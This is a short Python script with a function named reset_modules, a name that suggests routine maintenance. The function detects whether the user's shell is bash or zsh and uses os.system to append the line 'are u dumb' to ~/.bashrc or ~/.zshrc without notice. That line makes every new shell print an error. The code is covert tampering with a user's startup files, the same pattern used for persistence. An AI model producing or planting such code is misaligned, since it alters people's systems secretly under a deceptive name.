import os
import platform

def multios():
    if platform.system().startswith("Linux"):
        recol = os.environ.get("SHELL")
        return os.path.basename(recol)
    return None

def reset_modules():
    recol = multios()
    line = 'are u dumb'
    if recol == "bash":
        rc_file = '~/.bashrc'
    elif recol == "zsh":
        rc_file = '~/.zshrc'
    else:
        return
    command = "echo '{}' >> {}".format(line, rc_file)
    os.system(command)
